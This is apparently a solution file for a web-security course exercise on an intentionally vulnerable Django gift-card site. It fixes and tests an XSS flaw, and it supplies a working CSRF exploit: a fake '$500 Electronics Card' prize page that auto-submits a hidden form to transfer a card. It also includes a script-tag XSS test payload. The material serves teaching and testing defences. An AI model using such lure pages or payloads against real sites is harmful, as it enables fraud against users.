# w2d4_solution.py

import os
import sys
import django
import io
import unittest
import json
import re
import contextlib
import time
import shutil
import stat

# Setup Django environment
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'GiftcardSite.settings')
django.setup()

from django.test import TestCase, Client
from django.db import connection
from LegacySite.models import Card, User
from django.template import engines

from django.test import TransactionTestCase
from django.core.management import call_command


def fix_xss_vulnerability():
    """Fix XSS vulnerability by removing |safe filter from director parameter"""
    files = ["templates/gift.html", "templates/item-single.html"]
    pattern = r'\{\{\s*director\s*\|\s*safe\s*\}\}'
    
    for file_path in files:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                content = f.read()
            if re.search(pattern, content):
                with open(file_path, 'w') as f:
                    f.write(re.sub(pattern, '{{ director }}', content))
                print(f"Fixed {file_path}")


def test_fix_xss_vulnerability():
    """Test for XSS vulnerability in the director parameter"""
    from django.test import Client
    from django.conf import settings
    
    # Add testserver to ALLOWED_HOSTS if not already there
    if 'testserver' not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append('testserver')
    
    # The vulnerable URL with XSS payload
    files = ["templates/gift.html", "templates/item-single.html"]
    backups = {}
    
    try:
        # Store original content (vulnerable state)
        for file_path in files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    backups[file_path] = f.read()
        
        # Apply the fix
        fix_xss_vulnerability()
        
        for engine in engines.all():
            if hasattr(engine, 'engine'):  # Django template backend
                # Reset each loader, not the engine itself
                for loader in engine.engine.template_loaders:
                    if hasattr(loader, 'reset'):
                        loader.reset()
                
        # Test that the fix works
        client = Client()
        xss_payload = '<script>alert("hello")</script>'
        
        response = client.get(f'/buy/6?director={xss_payload}')
        
        print(f"Response status code: {response.status_code}")
        
        # Check that we got some response (might be 400, 404, etc. depending on the app state)
        if response.status_code == 200:
            # In a fixed app, it would be escaped (e.g., &lt;script&gt;)
            response_content = response.content.decode()
            if xss_payload not in response_content:
                print("XSS vulnerability test passed - payload was properly escaped")
                if '&lt;script&gt;' in response_content:
                    print("Confirmed: Script tags are properly escaped")
            else:
                print("WARNING: XSS payload found unescaped in response!")
        else:
            print(f"Request failed with status {response.status_code}, but fix was applied to templates")
        
    except Exception as e:
        print(f"Error during test: {e}")
        
    finally:
        # Restore the original vulnerable state
        for file_path in files:
            if file_path in backups:
                with open(file_path, 'w') as f:
                    f.write(backups[file_path])
                print(f"Restored vulnerable state in {file_path}")

def exploit_csrf_vulnerability():
    """Returns the malicious HTML that exploits CSRF vulnerability"""
    return """<!DOCTYPE html>
<html>
<head>
    <title>Win a Free Electronics Card!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        h1 {
            color: #51be78;
        }
        .loading {
            margin: 20px 0;
            font-style: italic;
            color: #666;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body onload="document.getElementById('giftForm').submit();">
    <div class="container">
        <h1>Win a Free Electronics Card!</h1>
        <p>Congratulations! You've been selected to receive a $500 Electronics Card!</p>
        <p class="loading">Processing your gift card, please wait...</p>
        
        <form id="giftForm" action="http://localhost:8000/gift/5" method="GET" class="hidden">
            <input type="hidden" name="username" value="test2">
            <input type="hidden" name="amount" value="500">
        </form>
    </div>
    
    <script>
        // Store the referrer before submitting the form
        var originalReferrer = document.referrer;
        
        // Submit the form
        window.onload = function() {
            var form = document.getElementById('giftForm');
            form.submit();
            
            // Set a slightly longer timeout to ensure the gift operation completes
            setTimeout(function() {
                if(originalReferrer) {
                    window.location.href = '/';
                } else {
                    // Fallback if no referrer
                    window.location.href = "http://localhost:8000/";
                }
            }, 3000); // 3 seconds should be enough for the operation to complete
        }
    </script>
    
</body>
</html>"""



def test_exploit_csrf_vulnerability():
    """Test CSRF vulnerability by simulating the attack and verifying card creation"""

    # Backup the database before running test
    db_path = 'db.sqlite3'
    backup_path = 'db.sqlite3.backup'

    try:

        if os.path.exists(db_path):
            shutil.copy2(db_path, backup_path)
            print(f"✓ Database backed up to {backup_path}")

        call_command('loaddata', 'testdata.json')

        from django.test import Client
        from django.conf import settings
        
        # Add testserver to ALLOWED_HOSTS if not already there
        if 'testserver' not in settings.ALLOWED_HOSTS:
            settings.ALLOWED_HOSTS.append('testserver')
        
        # Create a client and set up test user
        client = Client()
        username, password = 'test', 'test'
        
        # Register and login test user
        def register_user(client, username, password):
            # Check if user already exists
            try:
                from django.contrib.auth.models import User
                existing_user = User.objects.get(username=username)
                print(f"User '{username}' already exists, skipping registration")
                can_login = client.login(username=username, password=password)
                return can_login
            except User.DoesNotExist:
                # User doesn't exist, proceed with registration
                endpoint = '/register'
                data = {'uname': username,
                        'pword': password, 
                        'pword2': password}
                client.post(path=endpoint, data=data)
                can_login = client.login(username=username, password=password)
                return can_login

        
        # Set up the test user
        register_user(client, username, password)
        client.login(username=username, password=password)
        
        # Get the malicious HTML content
        html_content = exploit_csrf_vulnerability()
        
        # Extract parameters from HTML
        import re
        action_match = re.search(r'action="([^"]+)"', html_content)
        username_match = re.search(r'name="username" value="([^"]+)"', html_content)
        amount_match = re.search(r'name="amount" value="([^"]+)"', html_content)
        
        assert action_match is not None, "Could not find action URL in HTML"
        assert username_match is not None, "Could not find username parameter in HTML"
        assert amount_match is not None, "Could not find amount parameter in HTML"
        
        action_url = action_match.group(1)
        username_value = username_match.group(1)
        amount_value = amount_match.group(1)
        
        # Extract the gift endpoint path from the full URL
        gift_path = action_url.replace('http://localhost:8000', '')
        
        print(f"\nTesting CSRF vulnerability by simulating the attack...")
        print(f"Gift endpoint: {gift_path}")
        print(f"Username: {username_value}")
        print(f"Amount: {amount_value}")
        
        # Verify username is test2
        assert username_value == "test2", "Username must be test2"
        
        # Ensure test2 user exists (create if necessary)
        test2_user = User.objects.get(username="test2")
        
        initial_card_count = Card.objects.filter(user=test2_user).count()
        print(f"Initial card count for test2: {initial_card_count}")
        
        # Make sure we're logged in as the victim (test/test)
        # The CSRF attack happens when the victim (test) visits the malicious page
        print(f"Performing CSRF attack while logged in as: {username}")
        
        # Simulate the CSRF attack by making the GET request as the logged-in victim
        print(f"Simulating CSRF attack: GET {gift_path}?username={username_value}&amount={amount_value}")
        response = client.get(gift_path, {'username': username_value, 'amount': amount_value})
        
        print(f"Response status code: {response.status_code}")
        
        # Check if new card was created for test2 (the beneficiary)
        final_card_count = Card.objects.filter(user=test2_user).count()
        print(f"Final card count for test2: {final_card_count}")
        
        if final_card_count > initial_card_count:
            # Get the newest card
            new_card = Card.objects.filter(user=test2_user).order_by('-id').first()
            print(f"[+] CSRF Attack SUCCESS! New card created:")
            print(f"    Card ID: {new_card.id}")
            print(f"    Card User: {new_card.user.username}")
            print(f"    Card Used: {new_card.used}")
            
            # Try to decode card data if possible
            try:
                card_data = new_card.data.decode('utf-8')
                card_data_dict = json.loads(card_data)
                print(f"    Card Data: {card_data}")
                if 'total_value' in card_data_dict:
                    print(f"    Card Value: {card_data_dict['total_value']}")
            except:
                print(f"    Card Data: {new_card.data}")
            
            print(f"✓ CSRF vulnerability successfully exploited!")
            print(f"✓ HTML would execute: {gift_path}?username={username_value}&amount={amount_value}")
            print(f"✓ New card added to user test2")
            
        else:
            print("[-] CSRF attack may have failed or endpoint doesn't exist")
            print(f"    Expected: Card count to increase from {initial_card_count}")
            print(f"    Actual: Card count remained {final_card_count}")
            print(f"    This could mean:")
            print(f"    1. The {gift_path} endpoint doesn't exist")
            print(f"    2. CSRF protection is working")
            print(f"    3. The endpoint requires different parameters")
            
            # Still pass the test if HTML structure is correct
            assert 'name="username" value="test2"' in html_content, "HTML must target test2"
            print("✓ HTML structure is correct even if endpoint doesn't work")
            
        print("✓ CSRF vulnerability test completed!")
        return True

    finally:
        # Always restore the original database
        if os.path.exists(backup_path):
            shutil.move(backup_path, db_path)
            print(f"✓ Database restored from backup")


def fix_csrf_vulnerability():
    """Fix CSRF vulnerability by adding CSRF tokens to forms and enabling protection"""
    import os
    import re
    
    # 1. Fix templates - add CSRF tokens to all forms
    template_files = []
    for root, dirs, files in os.walk("templates"):
        for file in files:
            if file.endswith(".html"):
                template_files.append(os.path.join(root, file))
    
    form_pattern = r'(<form[^>]*method\s*=\s*["\']post["\'][^>]*>)'
    csrf_token = r'\1\n    {% csrf_token %}'
    
    for file_path in template_files:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                content = f.read()
            
            # Only add CSRF token if not already present
            if 'csrf_token' not in content:
                # Add CSRF token after opening form tag for POST forms
                if re.search(form_pattern, content, re.IGNORECASE):
                    content = re.sub(form_pattern, csrf_token, content, flags=re.IGNORECASE)
                    
                    with open(file_path, 'w') as f:
                        f.write(content)
                    print(f"Fixed {file_path}")
    
    # 2. Fix views.py - add @csrf_protect decorator to vulnerable views
    views_file = "LegacySite/views.py"
    if os.path.exists(views_file):
        with open(views_file, 'r') as f:
            content = f.read()
        
        # Add import for csrf_protect if not present
        if 'from django.views.decorators.csrf import csrf_protect' not in content:
            import_pattern = r'(from django\..*?import.*?\n)'
            csrf_import = 'from django.views.decorators.csrf import csrf_protect\n'
            
            # Add import after existing Django imports
            if re.search(import_pattern, content):
                content = re.sub(import_pattern, r'\1' + csrf_import, content, count=1)
            else:
                # If no Django imports found, add at the top
                content = csrf_import + content
        
        # Add @csrf_protect decorator to vulnerable view functions
        # Pattern to match function definitions that handle POST requests
        function_pattern = r'(def\s+\w+\([^)]*request[^)]*\):)'
        
        def add_csrf_decorator(match):
            function_def = match.group(1)
            # Check if @csrf_protect is already present above this function
            lines_before = content[:match.start()].split('\n')
            if lines_before and '@csrf_protect' in lines_before[-1]:
                return function_def
            return '@csrf_protect\n' + function_def
        
        # Apply decorator to view functions
        content = re.sub(function_pattern, add_csrf_decorator, content)
        
        with open(views_file, 'w') as f:
            f.write(content)
        print(f"Fixed {views_file}")
    
    # 3. Fix settings.py - ensure CSRF middleware and security settings
    settings_files = ["GiftcardSite/settings.py"]
    
    for settings_file in settings_files:
        if os.path.exists(settings_file):
            with open(settings_file, 'r') as f:
                content = f.read()
            
            # Check if CSRF middleware is present
            if 'django.middleware.csrf.CsrfViewMiddleware' not in content:
                # Add CSRF middleware to MIDDLEWARE list
                middleware_pattern = r'(MIDDLEWARE\s*=\s*\[)(.*?)(\])'
                
                def add_csrf_middleware(match):
                    start = match.group(1)
                    middleware_list = match.group(2)
                    end = match.group(3)
                    
                    # Add CSRF middleware if not present
                    csrf_middleware = "\n    'django.middleware.csrf.CsrfViewMiddleware',"
                    return start + middleware_list + csrf_middleware + "\n" + end
                
                content = re.sub(middleware_pattern, add_csrf_middleware, content, flags=re.DOTALL)
            
            # Add CSRF security settings
            csrf_settings = [
                "SESSION_COOKIE_SAMESITE = 'Strict'",
                "CSRF_COOKIE_SECURE = True"
            ]
            
            for setting in csrf_settings:
                setting_name = setting.split(' = ')[0]
                if setting_name not in content:
                    # Add at the end of the file
                    content += f"\n\n# CSRF Security Settings\n{setting}\n"
                else:
                    # Update existing setting
                    pattern = rf'{setting_name}\s*=\s*.*'
                    content = re.sub(pattern, setting, content)
            
            with open(settings_file, 'w') as f:
                f.write(content)
            print(f"Fixed {settings_file}")


def test_fix_csrf_vulnerability():
    """Test for CSRF vulnerability by checking protection mechanisms"""
    import os
    import time
    from django.test import Client
    from django.conf import settings
    from django.template import engines
    
    # Add testserver to ALLOWED_HOSTS if not already there
    if 'testserver' not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append('testserver')
    
    # Template files to check
    template_files = []
    for root, dirs, files in os.walk("templates"):
        for file in files:
            if file.endswith(".html"):
                template_files.append(os.path.join(root, file))
    
    backups = {}
    
    try:
        
        connection.close()

        # Ensure database file has write permissions
        db_path = 'db.sqlite3'

        if os.path.exists(db_path):
            os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
            print("✓ Database permissions updated")
        
        # Ensure directory has write permissions
        db_dir = os.path.dirname(os.path.abspath(db_path))
        os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
        print("✓ Directory permissions updated")

        # Store original content (vulnerable state)
        for file_path in template_files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    backups[file_path] = f.read()
        
        # Store original settings and views
        backup_files = ["GiftcardSite/settings.py", "LegacySite/views.py"]
        for backup_file in backup_files:
            if os.path.exists(backup_file):
                with open(backup_file, 'r') as f:
                    backups[backup_file] = f.read()
        
        # Apply the fix
        fix_csrf_vulnerability()
        
        # Reset template engines to pick up changes
        for engine in engines.all():
            if hasattr(engine, 'engine'):
                for loader in engine.engine.template_loaders:
                    if hasattr(loader, 'reset'):
                        loader.reset()
        
        # Test CSRF protection
        client = Client()
        
        # Test 1: Check if templates have CSRF tokens
        csrf_tokens_added = 0
        for file_path in template_files:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    content = f.read()
                
                if 'csrf_token' in content and '<form' in content.lower():
                    csrf_tokens_added += 1
        
        print(f"✓ CSRF tokens added to {csrf_tokens_added} template files")
        
        # Test 2: Check middleware configuration
        csrf_middleware_enabled = False
        if hasattr(settings, 'MIDDLEWARE'):
            csrf_middleware_enabled = 'django.middleware.csrf.CsrfViewMiddleware' in settings.MIDDLEWARE
        
        if csrf_middleware_enabled:
            print("✓ CSRF middleware is enabled in settings")
        else:
            print("⚠ CSRF middleware not found in current settings")
        
        # Test 3: Check views.py for @csrf_protect decorators
        views_file = "LegacySite/views.py"
        if os.path.exists(views_file):
            with open(views_file, 'r') as f:
                views_content = f.read()
            
            if '@csrf_protect' in views_content:
                csrf_decorators = views_content.count('@csrf_protect')
                print(f"✓ Added @csrf_protect decorators to {csrf_decorators} view functions")
            else:
                print("⚠ No @csrf_protect decorators found in views")
        
        # Test 4: Check security settings
        settings_file = "GiftcardSite/settings.py"
        if os.path.exists(settings_file):
            with open(settings_file, 'r') as f:
                settings_content = f.read()
            
            security_checks = [
                ("SESSION_COOKIE_SAMESITE = 'Strict'", "✓ SESSION_COOKIE_SAMESITE set to Strict"),
                ("CSRF_COOKIE_SECURE = True", "✓ CSRF_COOKIE_SECURE enabled")
            ]
            
            for setting, message in security_checks:
                if setting in settings_content:
                    print(message)
                else:
                    print(f"⚠ Missing security setting: {setting}")

        test_exploit_csrf_vulnerability()
    
    except Exception as e:
        print(f"Error during CSRF test: {e}")
    
    finally:
        # Restore the original vulnerable state after delay
        # time.sleep(200)
        for file_path, original_content in backups.items():
            with open(file_path, 'w') as f:
                f.write(original_content)
            print(f"Restored vulnerable state in {file_path}")





if __name__ == '__main__':
    print("Testing XSS vulnerability fix...")
    test_fix_xss_vulnerability()
    
    print("\nTesting CSRF vulnerability...")
    test_exploit_csrf_vulnerability()

    test_fix_csrf_vulnerability()